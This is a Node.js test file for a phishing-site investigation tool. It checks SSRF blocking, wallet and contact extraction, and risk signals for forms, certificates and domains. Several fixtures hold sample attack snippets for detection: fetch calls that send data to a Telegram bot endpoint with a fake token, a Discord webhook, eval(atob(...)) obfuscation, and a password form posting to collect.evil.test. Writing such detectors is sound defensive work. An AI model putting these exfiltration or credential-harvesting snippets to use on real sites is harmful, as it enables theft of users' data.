const assert = require("node:assert/strict");
const test = require("node:test");

const {
  assertSafeOutboundUrl,
  extractCryptoWalletDetails,
  extractCryptoWallets,
  extractSourceIndicators,
  isPrivateIp,
  normalizeTarget,
  publicSuffixParts,
} = require("../server");

test("normalizeTarget accepts IP addresses without converting them to URLs", () => {
  assert.deepEqual(normalizeTarget("8.8.8.8"), {
    input: "8.8.8.8",
    type: "ip",
    ip: "8.8.8.8",
    host: "8.8.8.8",
    url: null,
    normalized: "8.8.8.8",
  });
});

test("normalizeTarget defaults domains to HTTPS URLs", () => {
  const target = normalizeTarget("Example.com/login?x=1");
  assert.equal(target.type, "url");
  assert.equal(target.protocol, "https");
  assert.equal(target.host, "example.com");
  assert.equal(target.path, "/login?x=1");
  assert.equal(target.normalized, "https://example.com/login?x=1");
});

test("publicSuffixParts handles common multi-label public suffixes", () => {
  assert.deepEqual(publicSuffixParts("login.bank.example.co.uk"), {
    registeredDomain: "example.co.uk",
    subdomain: "login.bank",
    tld: "co.uk",
  });
  assert.deepEqual(publicSuffixParts("shop.example.com.au"), {
    registeredDomain: "example.com.au",
    subdomain: "shop",
    tld: "com.au",
  });
  assert.deepEqual(publicSuffixParts("tenant.blogspot.com"), {
    registeredDomain: "tenant.blogspot.com",
    subdomain: "",
    tld: "blogspot.com",
  });
});

test("isPrivateIp blocks local, private, reserved, and multicast ranges", () => {
  assert.equal(isPrivateIp("127.0.0.1"), true);
  assert.equal(isPrivateIp("10.0.0.5"), true);
  assert.equal(isPrivateIp("172.16.0.1"), true);
  assert.equal(isPrivateIp("192.168.1.1"), true);
  assert.equal(isPrivateIp("169.254.169.254"), true);
  assert.equal(isPrivateIp("224.0.0.1"), true);
  assert.equal(isPrivateIp("::1"), true);
  assert.equal(isPrivateIp("fe80::1"), true);
  assert.equal(isPrivateIp("fd00::1"), true);
  assert.equal(isPrivateIp("8.8.8.8"), false);
  assert.equal(isPrivateIp("2001:4860:4860::8888"), false);
});

test("assertSafeOutboundUrl rejects direct local and private targets", async () => {
  await assert.rejects(() => assertSafeOutboundUrl("http://localhost:3000"), /Local hostnames/);
  await assert.rejects(() => assertSafeOutboundUrl("http://127.0.0.1"), /blocked/);
  await assert.rejects(() => assertSafeOutboundUrl("http://[::1]/"), /blocked/);
  await assert.rejects(() => assertSafeOutboundUrl("http://169.254.169.254/latest/meta-data/"), /blocked/);
});

test("extractSourceIndicators finds useful investigation indicators", () => {
  const source = `
    <!doctype html>
    <html lang="en">
    <head>
      <title>Secure Account Review</title>
      <meta name="description" content="Verify your account details">
      <meta property="og:title" content="Account Center">
      <link rel="canonical" href="/login">
      <link rel="icon" href="/favicon.ico">
    </head>
    <body>
    <a href="/signin">Login</a>
    <form action="https://pay.example.test/submit" method="post">
      <input type="email" name="email" placeholder="Email address">
      <input type="password" name="password" autocomplete="current-password">
      <input type="text" name="otp_code" placeholder="One-time code">
      <input type="hidden" name="session" value="abc">
    </form>
    support@example.test +1 (555) 123-4567
    Wallet: 0x000000000000000000000000000000000000dead
    Telegram: @case_support
    </body></html>
  `;
  const indicators = extractSourceIndicators(source, "https://example.test");
  assert.equal(indicators.metadata.title, "Secure Account Review");
  assert.equal(indicators.metadata.description, "Verify your account details");
  assert.equal(indicators.metadata.openGraph.title, "Account Center");
  assert.equal(indicators.metadata.canonicalUrl, "https://example.test/login");
  assert.equal(indicators.metadata.faviconUrl, "https://example.test/favicon.ico");
  assert.equal(indicators.metadata.language, "en");
  assert.equal(indicators.emails[0], "support@example.test");
  assert.ok(indicators.links.includes("https://example.test/signin"));
  assert.ok(indicators.formActions.includes("https://pay.example.test/submit"));
  assert.equal(indicators.forms.length, 1);
  assert.equal(indicators.forms[0].method, "POST");
  assert.equal(indicators.forms[0].hasPassword, true);
  assert.equal(indicators.forms[0].hasOtp, true);
  assert.equal(indicators.forms[0].hiddenFieldCount, 1);
  assert.deepEqual(indicators.forms[0].inputs.map((input) => input.classification), ["identity", "credential", "credential", "other"]);
  assert.ok(indicators.phones.includes("+1 (555) 123-4567"));
  assert.ok(indicators.cryptoWallets.includes("0x000000000000000000000000000000000000dead"));
  assert.deepEqual(indicators.cryptoWalletDetails.find((wallet) => wallet.value === "0x000000000000000000000000000000000000dead"), {
    value: "0x000000000000000000000000000000000000dead",
    chain: "ethereum",
    network: "mainnet",
    addressType: "evm",
    explorerUrl: "https://etherscan.io/address/0x000000000000000000000000000000000000dead",
  });
  assert.deepEqual(indicators.socialHandles, ["Telegram @case_support"]);
});

test("extractCryptoWallets validates Bitcoin checksums and keeps Ethereum addresses", () => {
  const wallets = extractCryptoWallets(`
    Valid BTC legacy: 1BoatSLRHtKNngkdXEeobR76b53LETtpyT
    Valid BTC script: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
    Valid ETH: 0x000000000000000000000000000000000000dead
    Invalid BTC checksum: 1BoatSLRHtKNngkdXEeobR76b53LETtpyU
    Random base58-looking token: 1Q2w3E4r5T6y7U8i9O0pAaBbCcDdEeFfGg
  `);
  assert.ok(wallets.includes("1BoatSLRHtKNngkdXEeobR76b53LETtpyT"));
  assert.ok(wallets.includes("3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"));
  assert.ok(wallets.includes("0x000000000000000000000000000000000000dead"));
  assert.equal(wallets.includes("1BoatSLRHtKNngkdXEeobR76b53LETtpyU"), false);
  assert.equal(wallets.includes("1Q2w3E4r5T6y7U8i9O0pAaBbCcDdEeFfGg"), false);
});

test("extractSourceIndicators classifies wallet secret and payment forms", () => {
  const source = `
    <form action="/recover">
      <textarea name="seed_phrase" placeholder="Recovery phrase"></textarea>
      <input name="card_number" placeholder="Card number">
      <input name="cvv" placeholder="CVV">
    </form>
  `;
  const indicators = extractSourceIndicators(source, "https://example.test/wallet");

  assert.equal(indicators.forms[0].action, "https://example.test/recover");
  assert.equal(indicators.forms[0].hasWalletSecret, true);
  assert.equal(indicators.forms[0].hasPaymentField, true);
  assert.ok(indicators.forms[0].inputs.some((input) => input.classification === "wallet_secret"));
  assert.ok(indicators.forms[0].inputs.some((input) => input.classification === "payment"));
});

test("extractCryptoWalletDetails labels chains and explorer URLs", () => {
  const details = extractCryptoWalletDetails(`
    1BoatSLRHtKNngkdXEeobR76b53LETtpyT
    0x000000000000000000000000000000000000dead
  `);
  assert.deepEqual(details.find((wallet) => wallet.chain === "bitcoin"), {
    value: "1BoatSLRHtKNngkdXEeobR76b53LETtpyT",
    chain: "bitcoin",
    network: "mainnet",
    addressType: "p2pkh",
    explorerUrl: "https://mempool.space/address/1BoatSLRHtKNngkdXEeobR76b53LETtpyT",
  });
  assert.deepEqual(details.find((wallet) => wallet.chain === "ethereum"), {
    value: "0x000000000000000000000000000000000000dead",
    chain: "ethereum",
    network: "mainnet",
    addressType: "evm",
    explorerUrl: "https://etherscan.io/address/0x000000000000000000000000000000000000dead",
  });
});

const {
  buildSignals,
  isValidEthereumAddress,
  keccak256,
  rdapLookupPlan,
  summarizeRedirectChain,
  toEip55Address,
} = require("../server");

test("normalizeTarget strips brackets from IPv6 URL hosts", () => {
  const target = normalizeTarget("http://[2001:db8::1]:8443/panel");
  assert.equal(target.host, "2001:db8::1");
  assert.equal(target.port, "8443");
  assert.equal(target.url, "http://[2001:db8::1]:8443/panel");
});

test("buildSignals flags IPv6 literal URLs and punycode in any label", () => {
  const titles = (target) => buildSignals(target, {}, null, null, null, null, null).map((signal) => signal.title);
  assert.ok(titles(normalizeTarget("https://[2606:4700::1111]/")).includes("IP literal URL"));
  assert.ok(titles(normalizeTarget("https://login.xn--pple-43d.com/")).includes("Punycode hostname"));
  assert.ok(titles(normalizeTarget("https://xn--pple-43d.com/")).includes("Punycode hostname"));
  assert.equal(titles(normalizeTarget("https://login.example.com/")).includes("Punycode hostname"), false);
});

test("rdapLookupPlan uses the top-level domain to pick the RDAP server", () => {
  const bootstrap = {
    services: [
      [["uk"], ["https://rdap.nominet.uk/uk/"]],
      [["com", "net"], ["https://rdap.verisign.com/com/v1/"]],
      [["au"], ["https://rdap.cctld.au/rdap/"]],
    ],
  };
  assert.deepEqual(rdapLookupPlan("login.bank.example.co.uk", bootstrap), {
    tld: "uk",
    server: "https://rdap.nominet.uk/uk/",
    candidates: ["example.co.uk", "co.uk"],
  });
  assert.equal(rdapLookupPlan("shop.example.com.au", bootstrap).server, "https://rdap.cctld.au/rdap/");
  assert.deepEqual(rdapLookupPlan("tenant.blogspot.com", bootstrap), {
    tld: "com",
    server: "https://rdap.verisign.com/com/v1/",
    candidates: ["tenant.blogspot.com", "blogspot.com"],
  });
  assert.equal(rdapLookupPlan("example.invalidtld", bootstrap).server, null);
});

test("summarizeRedirectChain only reports a limit hit when the last hop still redirects", () => {
  const redirect = (n) => ({ ok: true, url: `https://a.test/${n}`, statusCode: 302, location: `https://a.test/${n + 1}` });
  const redirects = Array.from({ length: 6 }, (_, n) => redirect(n));
  const landed = summarizeRedirectChain([...redirects, { ok: true, url: "https://a.test/6", statusCode: 200, location: null }], "https://a.test/0");
  assert.equal(landed.redirectLimitHit, false);
  assert.equal(landed.finalUrl, "https://a.test/6");

  const looping = summarizeRedirectChain([...redirects, redirect(6)], "https://a.test/0");
  assert.equal(looping.redirectLimitHit, true);
  assert.equal(summarizeRedirectChain([], "https://a.test/").finalUrl, "https://a.test/");
});

test("keccak256 matches the Ethereum reference vectors", () => {
  assert.equal(keccak256(""), "c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470");
  assert.equal(keccak256("abc"), "4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45");
  assert.equal(keccak256("a".repeat(200)).length, 64);
});

test("isValidEthereumAddress enforces EIP-55 for mixed-case addresses", () => {
  for (const address of [
    "0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed",
    "0xfB6916095ca1df60bB79Ce92cE3Ea74c37c5d359",
    "0xdbF03B407c01E7cD3CBea99509d93f8DDDC8C6FB",
    "0xD1220A0cf47c7B9Be7A2E6BA89F429762e7b9aDb",
  ]) {
    assert.equal(isValidEthereumAddress(address), true, address);
    assert.equal(toEip55Address(address.toLowerCase()), address);
  }
  assert.equal(isValidEthereumAddress("0x5aaeb6053f3e94c9b9a09f33669435e7ef1beaed"), true);
  assert.equal(isValidEthereumAddress("0x5AAEB6053F3E94C9B9A09F33669435E7EF1BEAED"), true);
  assert.equal(isValidEthereumAddress("0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAeD"), false);
  assert.deepEqual(extractCryptoWallets("pay 0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAeD now"), []);
});

test("extractSourceIndicators skips asset names and dates that look like emails or phones", () => {
  const indicators = extractSourceIndicators(`
    <img src="/img/logo@2x.png" srcset="hero@3x.webp 3x">
    <time>2026-10-01 12</time> <span>01/10/2026</span>
    Contact help@example.test or call +44 20 7946 0958
  `, "https://example.test");
  assert.deepEqual(indicators.emails, ["help@example.test"]);
  assert.deepEqual(indicators.phones, ["+44 20 7946 0958"]);
});

const TELEGRAM_TOKEN = `7012345678:AA${"Fh3kQ9zXbV2mL8pR4tW6yN1cJ5gD7sE0uIo".slice(0, 33)}`;

function signalTitles({ target = "https://shop.example.test/login", dns = {}, tls = null, source = null, rdap = null } = {}) {
  return buildSignals(normalizeTarget(target), dns, null, tls, source, rdap, null).map((signal) => `${signal.level}:${signal.title}`);
}

function sourceProfile(html, url = "https://shop.example.test/login") {
  return { ok: true, url, ...extractSourceIndicators(html, url) };
}

test("extractCryptoWalletDetails recognizes TRON addresses with a valid checksum", () => {
  const details = extractCryptoWalletDetails("Send USDT (TRC20) to TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t, not TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6u");
  assert.deepEqual(details, [{
    value: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    chain: "tron",
    network: "mainnet",
    addressType: "base58",
    explorerUrl: "https://tronscan.org/#/address/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  }]);
  assert.deepEqual(extractCryptoWallets("Token12345678901234567890123456789"), []);
});

test("extractSourceIndicators finds Telegram bot tokens and Discord webhooks", () => {
  const indicators = extractSourceIndicators(`
    <script>
      fetch("https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage", { method: "POST" });
      const hook = "https://discord.com/api/webhooks/123456789012345678/abcDEF_ghi-JKLmnopQRSTuvwxYZ0123";
    </script>
  `, "https://example.test");
  assert.deepEqual(indicators.exfilEndpoints.map(({ type, id }) => [type, id]), [
    ["telegram_bot", "7012345678"],
    ["discord_webhook", "123456789012345678"],
  ]);
  assert.equal(indicators.exfilEndpoints[0].value, TELEGRAM_TOKEN);
});

test("extractSourceIndicators notes a Telegram bot API reference even without a literal token", () => {
  const indicators = extractSourceIndicators(`<script>fetch("https://api.telegram.org/bot" + key + "/sendMessage")</script>`, "https://example.test");
  assert.deepEqual(indicators.exfilEndpoints.map((endpoint) => endpoint.type), ["telegram_api"]);
  assert.deepEqual(extractSourceIndicators("<p>Join us on Telegram</p>", "https://example.test").exfilEndpoints, []);
});

test("extractSourceIndicators detects script obfuscation techniques", () => {
  const ids = Array.from({ length: 25 }, (_, index) => `_0x${(0xa1b2 + index).toString(16)}`).join(";");
  const indicators = extractSourceIndicators(`
    <script>eval(atob("YWxlcnQoMSk="));</script>
    <script>document.write(unescape("%3Cscript%3E"));</script>
    <script>${ids}</script>
    <script>var blob = "${"QUJD".repeat(600)}";</script>
  `, "https://example.test");
  const found = Object.fromEntries(indicators.scriptObfuscation.map((entry) => [entry.technique, entry.strong]));
  assert.equal(found["eval of decoded string"], true);
  assert.equal(found["document.write of decoded string"], true);
  assert.equal(found["obfuscator.io identifiers"], true);
  assert.equal(found["large base64 string literal"], false);
  assert.deepEqual(extractSourceIndicators(`<script>const x = atob(data); console.log(_0xab12)</script><img src="data:image/png;base64,${"A".repeat(3000)}">`, "https://example.test").scriptObfuscation, []);
});

test("buildSignals flags sensitive forms that post to another domain or over HTTP", () => {
  const offsite = signalTitles({ source: sourceProfile(`<form action="https://collect.evil.test/p.php" method="post"><input type="password" name="pw"></form>`) });
  assert.ok(offsite.includes("high:Sensitive form posts to another domain"));

  const sameSite = signalTitles({ source: sourceProfile(`<form action="https://auth.example.test/login"><input type="password" name="pw"></form>`) });
  assert.equal(sameSite.some((title) => title.includes("another domain")), false);

  const newsletter = signalTitles({ source: sourceProfile(`<form action="https://list.mailer.test/subscribe"><input type="email" name="email"></form>`) });
  assert.ok(newsletter.includes("info:Form posts to another domain"));

  const plain = signalTitles({ source: sourceProfile(`<form action="http://shop.example.test/pay"><input name="card_number"></form>`) });
  assert.ok(plain.includes("high:Sensitive form submits over plain HTTP"));
});

test("buildSignals raises exfiltration and obfuscation signals", () => {
  const titles = signalTitles({ source: sourceProfile(`<script>eval(atob("x")); fetch("https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage")</script>`) });
  assert.ok(titles.includes("high:Data exfiltration endpoint"));
  assert.ok(titles.includes("medium:Obfuscated script"));
  assert.ok(signalTitles({ source: sourceProfile(`<script>var b = "${"QUJD".repeat(600)}";</script>`) }).includes("info:Obfuscated script"));
});

test("buildSignals reports recently issued certificates and short registrations", () => {
  const day = 86400000;
  const tls = { ok: true, authorized: true, validFrom: new Date(Date.now() - 2 * day).toUTCString(), validTo: new Date(Date.now() + 88 * day).toUTCString() };
  assert.ok(signalTitles({ tls }).includes("info:Recently issued certificate"));
  assert.equal(signalTitles({ tls: { ...tls, validFrom: new Date(Date.now() - 40 * day).toUTCString() } }).includes("info:Recently issued certificate"), false);

  const rdap = {
    ok: true,
    domain: "example.test",
    ageDays: 345,
    registrationDate: new Date(Date.now() - 345 * day).toISOString(),
    expirationDate: new Date(Date.now() + 20 * day).toISOString(),
  };
  const titles = signalTitles({ rdap });
  assert.ok(titles.includes("info:One-year registration"));
  assert.ok(titles.includes("info:Domain expires soon"));

  const established = signalTitles({ rdap: { ...rdap, ageDays: 4000, registrationDate: new Date(Date.now() - 4000 * day).toISOString(), expirationDate: new Date(Date.now() + 900 * day).toISOString() } });
  assert.equal(established.some((title) => /One-year|expires soon/.test(title)), false);
});

test("buildSignals checks the registered domain for mail servers", () => {
  const live = { A: { ok: true, value: ["93.184.216.34"] } };
  const noMx = { ...live, MX: { ok: false, error: "ENODATA" }, DOMAIN_MX: { ok: false, error: "ENOTFOUND" } };
  const contact = sourceProfile("<p>Write to support@example.test</p>");

  assert.ok(signalTitles({ dns: noMx, source: contact }).includes("medium:Contact email cannot receive mail"));
  assert.ok(signalTitles({ dns: noMx }).includes("info:No mail server"));
  assert.ok(signalTitles({ dns: { ...noMx, DOMAIN_MX: { ok: true, value: [{ exchange: ".", priority: 0 }] } } }).includes("info:No mail server"));

  const domainHasMx = { ...noMx, DOMAIN_MX: { ok: true, value: [{ exchange: "mx.example.test", priority: 10 }] } };
  const flaky = { ...noMx, DOMAIN_MX: { ok: false, error: "ESERVFAIL" } };
  for (const dns of [domainHasMx, flaky]) {
    assert.equal(signalTitles({ dns, source: contact }).some((title) => /mail/i.test(title)), false);
  }
});

test("extractSourceIndicators ignores SVG path data and meta tag names", () => {
  const indicators = extractSourceIndicators(`
    <head>
      <meta name="twitter:card" content="summary_large_image">
      <meta name="twitter:title" content="Portfolio">
      <meta name="twitter:description" content="Projects">
      <meta name="twitter:image" content="https://example.test/card.png">
    </head>
    <body>
      <a href="https://www.linkedin.com/in/jane-doe/" aria-label="LinkedIn">
        <svg viewBox="0 0 24 24"><path d="M20.45 20.45h-3.55v-5.57c0-1.33-.02-3.04-1.85-3.04ZM22.22 0H1.77C.79 0 0 .77 0 1.72v20.56C0 23.23.79 24 1.77 24h20.45C23.2 24 24 23.23 24 22.28V1.72C24 .77 23.2 0 22.22 0Z"/></svg>
      </a>
      <svg><path d="m2 7 10 7 10-7"/></svg>
      <style>.grid { margin: 10 20 30 40px; }</style>
      <script>const coords = [12.34 56.78 90.12 34.56];</script>
      <p>Released 2026, version 3 of the toolkit.</p>
    </body>
  `, "https://example.test/");
  assert.deepEqual(indicators.phones, []);
  assert.deepEqual(indicators.socialHandles, ["LinkedIn jane-doe"]);
});

test("extractSourceIndicators reads phones from visible text and tel: links", () => {
  const indicators = extractSourceIndicators(`
    <p>Call <b>+44 20 7946 0958</b> or WhatsApp us.</p>
    <a href="tel:+1-202-555-0143">Hotline</a>
    <a href="tel:%2B33%201%2023%2045%2067%2089">Paris</a>
    <!-- +99 9999 9999 hidden in a comment -->
  `, "https://example.test/");
  assert.deepEqual(indicators.phones, ["+1-202-555-0143", "+33 1 23 45 67 89", "+44 20 7946 0958"]);
});

test("extractSourceIndicators derives social handles from profile links and text", () => {
  const indicators = extractSourceIndicators(`
    <head><meta name="twitter:site" content="@scam_support"></head>
    <a href="https://t.me/recovery_agent_77">Chat</a>
    <a href="https://t.me/+AbCdEfGh1234">Join group</a>
    <a href="https://t.me/share/url?url=x">Share</a>
    <a href="https://t.me/joinchat/LegacyCode99">Old invite</a>
    <a href="https://wa.me/447700900123">WhatsApp</a>
    <a href="https://api.whatsapp.com/send?phone=15550001111">WhatsApp</a>
    <a href="https://www.instagram.com/crypto.mentor/">IG</a>
    <a href="https://www.instagram.com/p/Cx123/">Post</a>
    <a href="https://twitter.com/intent/tweet?text=x">Tweet</a>
    <a href="https://www.tiktok.com/@fastprofits">TikTok</a>
    <p>Telegram: @desk_manager. Questions? Email help@example.test or Signal @secure.line</p>
  `, "https://example.test/");
  assert.deepEqual(indicators.socialHandles, [
    "Instagram @crypto.mentor",
    "Signal @secure.line",
    "Telegram @desk_manager",
    "Telegram @recovery_agent_77",
    "Telegram invite +AbCdEfGh1234",
    "Telegram invite +LegacyCode99",
    "TikTok @fastprofits",
    "WhatsApp +15550001111",
    "WhatsApp +447700900123",
    "X @scam_support",
  ]);
});
